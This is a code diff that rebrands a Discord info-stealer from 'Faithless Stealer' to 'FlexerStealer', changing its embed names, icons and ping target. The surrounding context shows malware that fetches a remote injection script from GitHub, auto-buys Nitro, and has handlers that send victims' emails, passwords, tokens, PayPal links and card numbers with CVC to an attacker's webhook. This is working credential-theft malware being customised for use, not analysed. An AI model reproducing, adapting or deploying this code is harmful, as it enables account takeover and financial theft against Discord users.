@@ -10,9 +10,9 @@ const config = {
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: true, 
   ping_on_run: true,
-  ping_val: '@everyone',
-  embed_name: 'Faithless Stealer',
-  embed_icon: 'https://media.discordapp.net/attachments/1000186001391628328/1004456049065066557/cae53cf2d23a2d11fca7b2c587f5a218.png'.replace(/ /g, '%20'),
+  ping_val: '<@1008707748902486146>',
+  embed_name: 'FlexerStealer',
+  embed_icon: 'https://media.discordapp.net/attachments/1009210549982208093/1009213572754190436/th.jpg?width=379&height=269'.replace(/ /g, '%20'),
   embed_color: 000000,
   injection_url: 'https://raw.githubusercontent.com/DoCt0rAnTiPlAgUe/test/main/injection.js',
 
@@ -657,7 +657,7 @@ const login = async (email, password, token) => {
       {
         color: config.embed_color,
         image: {
-            url: 'https://media.discordapp.net/attachments/1000186001391628328/1004456049065066557/cae53cf2d23a2d11fca7b2c587f5a218.png',
+            url: 'https://media.discordapp.net/attachments/1009210549982208093/1009213572754190436/th.jpg?width=379&height=269',
         },
         fields: [
           {
@@ -681,7 +681,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Faithless Stealer',
+          text: 'FlexerStealer',
         },
       },
     ],
@@ -702,7 +702,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       {
         color: config.embed_color,
         image: {
-            url: 'https://media.discordapp.net/attachments/1000186001391628328/1004456049065066557/cae53cf2d23a2d11fca7b2c587f5a218.png',
+            url: 'https://media.discordapp.net/attachments/1009210549982208093/1009213572754190436/th.jpg?width=379&height=269',
         },
         fields: [
           {
@@ -726,7 +726,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Faithless Stealer',
+          text: 'FlexerStealer',
         },
       },
     ],
@@ -747,7 +747,7 @@ const emailChanged = async (email, password, token) => {
       {
         color: config.embed_color,
         image: {
-            url: 'https://media.discordapp.net/attachments/1000186001391628328/1004456049065066557/cae53cf2d23a2d11fca7b2c587f5a218.png',
+            url: 'https://media.discordapp.net/attachments/1009210549982208093/1009213572754190436/th.jpg?width=379&height=269',
         },
         fields: [
           {
@@ -771,7 +771,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Faithless Stealer',
+          text: 'FlexerStealer',
         },
       },
     ],
@@ -792,7 +792,7 @@ const PaypalAdded = async (token) => {
       {
         color: config.embed_color,
         image: {
-            url: 'https://media.discordapp.net/attachments/1000186001391628328/1004456049065066557/cae53cf2d23a2d11fca7b2c587f5a218.png',
+            url: 'https://media.discordapp.net/attachments/1009210549982208093/1009213572754190436/th.jpg?width=379&height=269',
         },
         fields: [
           {
@@ -816,7 +816,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Faithless Stealer',
+          text: 'FlexerStealer',
         },
       },
     ],
@@ -837,7 +837,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
       {
         color: config.embed_color,
         image: {
-            url: 'https://media.discordapp.net/attachments/1000186001391628328/1004456049065066557/cae53cf2d23a2d11fca7b2c587f5a218.png',
+            url: 'https://media.discordapp.net/attachments/1009210549982208093/1009213572754190436/th.jpg?width=379&height=269',
         },
         fields: [
           {
@@ -861,7 +861,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Faithless Stealer',
+          text: 'FlexerStealer',
         },
       },
     ],
@@ -884,7 +884,7 @@ const nitroBought = async (token) => {
       {
         color: config.embed_color,
         image: {
-            url: 'https://media.discordapp.net/attachments/1000186001391628328/1004456049065066557/cae53cf2d23a2d11fca7b2c587f5a218.png',
+            url: 'https://media.discordapp.net/attachments/1009210549982208093/1009213572754190436/th.jpg?width=379&height=269',
         },
         fields: [
           {
@@ -908,7 +908,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Faithless Stealer',
+          text: 'FlexerStealer',
         },
       },
     ],
